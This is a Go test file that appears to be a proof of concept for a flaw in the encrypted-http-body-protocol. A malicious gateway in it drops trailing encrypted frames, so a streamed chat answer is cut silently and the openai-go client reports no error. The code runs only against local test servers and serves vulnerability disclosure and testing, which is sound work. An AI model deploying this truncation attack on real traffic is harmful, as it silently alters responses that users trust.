package poc

// PoC: an on-path intermediary (the client's TLS peer, e.g. the gateway) can
// silently truncate an EHBP-encrypted streamed chat completion at any frame
// boundary. Every EHBP client treats entity-body EOF as the end of message
// (SPEC 4.3: no sentinel frame, no length commitment), so the decrypted
// stream ends cleanly and openai-go reports no error.
//
// Topology (all loopback, plain HTTP so the "gateway" can see the framing):
//
//	openai-go -> EHBP client transport -> gateway (drops trailing frames) -> EHBP server (HEAD middleware) -> SSE handler

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	ehbpclient "github.com/tinfoilsh/encrypted-http-body-protocol/client"
	"github.com/tinfoilsh/encrypted-http-body-protocol/identity"
)

// sseEvents is what the enclave actually streams: five content deltas and a
// terminal [DONE]. Each Write+Flush becomes one EHBP frame, exactly like
// httputil.ReverseProxy with FlushInterval=-1 (SSE) in the production shim.
var sseEvents = []string{
	`data: {"id":"c1","object":"chat.completion.chunk","created":1,"model":"m","choices":[{"index":0,"delta":{"role":"assistant","content":"The "},"finish_reason":null}]}` + "\n\n",
	`data: {"id":"c1","object":"chat.completion.chunk","created":1,"model":"m","choices":[{"index":0,"delta":{"content":"answer "},"finish_reason":null}]}` + "\n\n",
	`data: {"id":"c1","object":"chat.completion.chunk","created":1,"model":"m","choices":[{"index":0,"delta":{"content":"is "},"finish_reason":null}]}` + "\n\n",
	`data: {"id":"c1","object":"chat.completion.chunk","created":1,"model":"m","choices":[{"index":0,"delta":{"content":"NOT "},"finish_reason":null}]}` + "\n\n",
	`data: {"id":"c1","object":"chat.completion.chunk","created":1,"model":"m","choices":[{"index":0,"delta":{"content":"42."},"finish_reason":"stop"}]}` + "\n\n",
	"data: [DONE]\n\n",
}

func newEnclave(t *testing.T) (*httptest.Server, *identity.Identity) {
	t.Helper()
	id, err := identity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/v1/chat/completions", func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		if !bytes.Contains(body, []byte(`"messages"`)) {
			http.Error(w, "bad request", 400)
			return
		}
		if bytes.Contains(body, []byte(`"stream":true`)) {
			w.Header().Set("Content-Type", "text/event-stream")
			w.WriteHeader(200)
			for _, ev := range sseEvents {
				_, _ = w.Write([]byte(ev))
				w.(http.Flusher).Flush() // one EHBP frame per SSE event
			}
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(200)
		_, _ = w.Write([]byte(`{"id":"c1","object":"chat.completion","created":1,"model":"m","choices":[{"index":0,"message":{"role":"assistant","content":"The answer is NOT 42."},"finish_reason":"stop"}]}`))
	})
	srv := httptest.NewServer(id.Middleware()(mux))
	t.Cleanup(srv.Close)
	return srv, id
}

// newGateway is the intermediary. It forwards the encrypted request untouched
// and relays the encrypted response, but keeps only the first keepFrames
// frames of the body and then ends the entity body cleanly. It never holds
// any key material.
func newGateway(t *testing.T, upstream string, keepFrames int, seen *atomic.Int32) *httptest.Server {
	t.Helper()
	gw := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		req, err := http.NewRequestWithContext(r.Context(), r.Method, upstream+r.URL.RequestURI(), r.Body)
		if err != nil {
			t.Fatal(err)
		}
		req.Header = r.Header.Clone()
		resp, err := http.DefaultTransport.RoundTrip(req)
		if err != nil {
			http.Error(w, err.Error(), 502)
			return
		}
		defer resp.Body.Close()
		for k, vv := range resp.Header {
			if k == "Content-Length" {
				continue
			}
			for _, v := range vv {
				w.Header().Add(k, v)
			}
		}
		w.WriteHeader(resp.StatusCode)
		// Relay frame by frame: LEN(4, BE) || CIPHERTEXT(LEN). The framing is
		// plaintext by design (SPEC 7.2), so the gateway can cut on a boundary.
		var frames int
		for {
			var hdr [4]byte
			if _, err := io.ReadFull(resp.Body, hdr[:]); err != nil {
				return // upstream EOF
			}
			n := binary.BigEndian.Uint32(hdr[:])
			ct := make([]byte, n)
			if _, err := io.ReadFull(resp.Body, ct); err != nil {
				return
			}
			frames++
			seen.Add(1)
			if keepFrames >= 0 && frames > keepFrames {
				// Drop this and all later frames; drain upstream and end cleanly.
				_, _ = io.Copy(io.Discard, resp.Body)
				return
			}
			_, _ = w.Write(hdr[:])
			_, _ = w.Write(ct)
			w.(http.Flusher).Flush()
		}
	}))
	t.Cleanup(gw.Close)
	return gw
}

func newOpenAIClient(t *testing.T, gatewayURL string, id *identity.Identity) openai.Client {
	t.Helper()
	// Same construction as tinfoil-go's buildEHBPTransport: an identity from
	// the attested HPKE public key, no key fetch, wrapped by the OpenAI client.
	serverID, err := identity.FromPublicKeyHex(id.MarshalPublicKeyHex())
	if err != nil {
		t.Fatal(err)
	}
	tr, err := ehbpclient.NewTransportWithIdentity(serverID)
	if err != nil {
		t.Fatal(err)
	}
	return openai.NewClient(
		option.WithAPIKey("tinfoil-test-key"),
		option.WithBaseURL(gatewayURL+"/v1/"),
		option.WithHTTPClient(&http.Client{Transport: tr}),
		option.WithMaxRetries(0),
	)
}

func streamCompletion(t *testing.T, c openai.Client) (string, string, error) {
	t.Helper()
	stream := c.Chat.Completions.NewStreaming(context.Background(), openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("Is the answer 42?")},
	})
	var sb strings.Builder
	var finish string
	for stream.Next() {
		ch := stream.Current()
		if len(ch.Choices) > 0 {
			sb.WriteString(ch.Choices[0].Delta.Content)
			if ch.Choices[0].FinishReason != "" {
				finish = ch.Choices[0].FinishReason
			}
		}
	}
	return sb.String(), finish, stream.Err()
}

func TestPoC_StreamTruncationUndetected(t *testing.T) {
	enclave, id := newEnclave(t)

	// Control: honest gateway relays every frame.
	var seenAll atomic.Int32
	honest := newGateway(t, enclave.URL, -1, &seenAll)
	content, finish, err := streamCompletion(t, newOpenAIClient(t, honest.URL, id))
	t.Logf("honest gateway:   err=%v finish=%q content=%q (frames relayed=%d)", err, finish, content, seenAll.Load())
	if err != nil || content != "The answer is NOT 42." || finish != "stop" {
		t.Fatalf("control failed: err=%v content=%q", err, content)
	}

	// Attack: the gateway keeps the first 3 frames ("The ", "answer ", "is ")
	// and drops the "NOT ", "42." and [DONE] frames, ending the body cleanly.
	var seenCut atomic.Int32
	cutting := newGateway(t, enclave.URL, 3, &seenCut)
	content, finish, err = streamCompletion(t, newOpenAIClient(t, cutting.URL, id))
	t.Logf("truncating gateway: err=%v finish=%q content=%q", err, finish, content)
	if err != nil {
		t.Fatalf("expected the truncated stream to be accepted silently, got err=%v", err)
	}
	if content != "The answer is " {
		t.Fatalf("unexpected content %q", content)
	}
	if finish != "" {
		t.Fatalf("finish_reason should be absent on a truncated stream, got %q", finish)
	}
	t.Logf("VULNERABLE: openai-go returned a truncated answer %q with stream.Err()==nil; the [DONE] sentinel and finish_reason were dropped by the intermediary and nothing detected it", content)

	// For contrast: cutting inside a frame (not on a boundary) IS detected.
	// Reuse the gateway but splice: keep 3 frames and then 1 byte of frame 4.
	var seenMid atomic.Int32
	midCut := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		req, _ := http.NewRequestWithContext(r.Context(), r.Method, enclave.URL+r.URL.RequestURI(), r.Body)
		req.Header = r.Header.Clone()
		resp, err := http.DefaultTransport.RoundTrip(req)
		if err != nil {
			http.Error(w, err.Error(), 502)
			return
		}
		defer resp.Body.Close()
		for k, vv := range resp.Header {
			if k != "Content-Length" {
				w.Header()[k] = vv
			}
		}
		w.WriteHeader(resp.StatusCode)
		for i := 0; ; i++ {
			var hdr [4]byte
			if _, err := io.ReadFull(resp.Body, hdr[:]); err != nil {
				return
			}
			ct := make([]byte, binary.BigEndian.Uint32(hdr[:]))
			if _, err := io.ReadFull(resp.Body, ct); err != nil {
				return
			}
			seenMid.Add(1)
			if i == 3 {
				_, _ = w.Write(hdr[:]) // partial frame: length prefix only
				_, _ = io.Copy(io.Discard, resp.Body)
				return
			}
			_, _ = w.Write(hdr[:])
			_, _ = w.Write(ct)
		}
	}))
	t.Cleanup(midCut.Close)
	content, _, err = streamCompletion(t, newOpenAIClient(t, midCut.URL, id))
	t.Logf("mid-frame cut (control): err=%v content=%q", err, content)
	if err == nil {
		t.Fatalf("a mid-frame cut must be detected")
	}
}

func TestPoC_NonStreamingTruncationIsDetectedByJSON(t *testing.T) {
	// Non-streaming JSON bodies are a single frame in practice (one Write), so
	// a boundary cut removes the whole body: openai-go fails on empty/invalid
	// JSON. This shows the exposure is specific to streamed (multi-frame) bodies.
	enclave, id := newEnclave(t)
	var seen atomic.Int32
	cutting := newGateway(t, enclave.URL, 0, &seen)
	c := newOpenAIClient(t, cutting.URL, id)
	_, err := c.Chat.Completions.New(context.Background(), openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("hi")},
	})
	t.Logf("non-streaming, all frames dropped: err=%v", err)
	if err == nil {
		t.Fatalf("expected an error")
	}
	_ = fmt.Sprintf
}
